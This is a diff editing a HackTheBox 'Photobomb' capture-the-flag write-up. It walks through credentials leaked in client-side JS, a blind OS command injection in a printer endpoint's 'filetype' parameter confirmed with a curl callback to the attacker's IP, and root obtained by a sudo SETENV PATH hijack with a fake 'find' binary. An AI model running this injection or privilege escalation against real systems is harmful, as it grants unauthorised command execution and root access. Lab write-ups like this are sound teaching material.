@@ -5,6 +5,7 @@ subtitle: "leaked tech-support Basic auth into command injection on the printer 
 date: 2023-02-02
 tags: [htb, linux, command-injection, sudo, privesc]
 category: writeups
+kind: machine
 tldr: "A JS file pre-filled tech-support creds when a specific cookie was set, giving Basic auth to /printer. The filetype POST param had OS command injection for a shell as wizard. Root came from a sudo SETENV rule that let me prepend /tmp to PATH and hijack find and cd called by /opt/cleanup.sh."
 ---
 
@@ -30,7 +31,7 @@ If the cookie `isPhotoBombTechSupport` is present, the page rewrites a link to i
 
 ## foothold
 
-The printer endpoint takes a `photo`, a `filetype`, and `dimensions`. The `filetype` value was passed to a shell, so I appended a command after a semicolon and confirmed it with a callback to my box.
+The printer endpoint takes a `photo`, a `filetype`, and `dimensions`. The injection is blind, the app returns no command output, so I narrowed the parameter by timing. Injecting into `photo` or `dimensions` returned a 500 immediately, but `filetype` hung for several seconds when I appended a `sleep`, which meant my command was actually running there. The other two are validated against allowed values; `filetype` is concatenated straight into the shell call. I appended a command after a semicolon and confirmed it with an OOB callback to my box.
 
 ```
 photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg; curl http://10.10.16.52:8000/test&dimensions=3000x2000
@@ -48,22 +49,33 @@ The shell came back as `wizard`, which had the user flag and an SSH key for a st
 
 ## root
 
-wizard could run a cleanup script as root, but the sudo rule kept the environment with SETENV, which let me supply my own PATH.
+wizard could run a cleanup script as root, and the sudo rule kept the environment with SETENV, which let me supply my own PATH:
 
 ```
-sudo PATH=/tmp:$PATH /opt/cleanup.sh
+(root) SETENV: NOPASSWD: /opt/cleanup.sh
 ```
 
-`/opt/cleanup.sh` called `find` and `cd` by name, so they resolved against my PATH first. I dropped fake binaries in `/tmp` that just spawn a shell.
+`/opt/cleanup.sh` uses absolute paths for most of its commands (`/bin/cat`, `/usr/bin/truncate`), but it calls `find` by bare name:
 
 ```bash
-echo "/bin/bash" > /tmp/cd
-echo "/bin/bash" > /tmp/find
-sudo PATH=/tmp:$PATH /opt/cleanup.sh
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 ```
 
-When the script called `find`, it ran my `/tmp/find` as root, dropping a root shell and the root flag.
+`SETENV` defeats sudo's `secure_path`, so I prepended a writable directory to PATH and dropped a fake `find` there that just spawns a shell:
+
+```bash
+cd /dev/shm
+echo -e '#!/bin/bash\nbash' > find
+chmod +x find
+sudo PATH=$PWD:$PATH /opt/cleanup.sh
+```
+
+When the script reached the bare `find`, it ran my `/dev/shm/find` as root, dropping a root shell and the root flag.
 
 ## takeaway
 
-The creds were sitting in client-side JS behind a cookie check, the printer trusted unsanitized input straight into a command, and the sudo rule kept PATH attacker-controlled. A SETENV grant on a script that calls bare command names is a PATH hijack waiting to happen.
+The creds were sitting in client-side JS behind a cookie check, the printer trusted unsanitized input straight into a command, and the sudo rule kept PATH attacker-controlled. `SETENV` cancels out `secure_path`, so a grant on a script that calls even one bare command name is a PATH hijack waiting to happen.
+
+## references
+
+- [0xdf, HTB: Photobomb](https://0xdf.gitlab.io/2023/02/11/htb-photobomb.html)
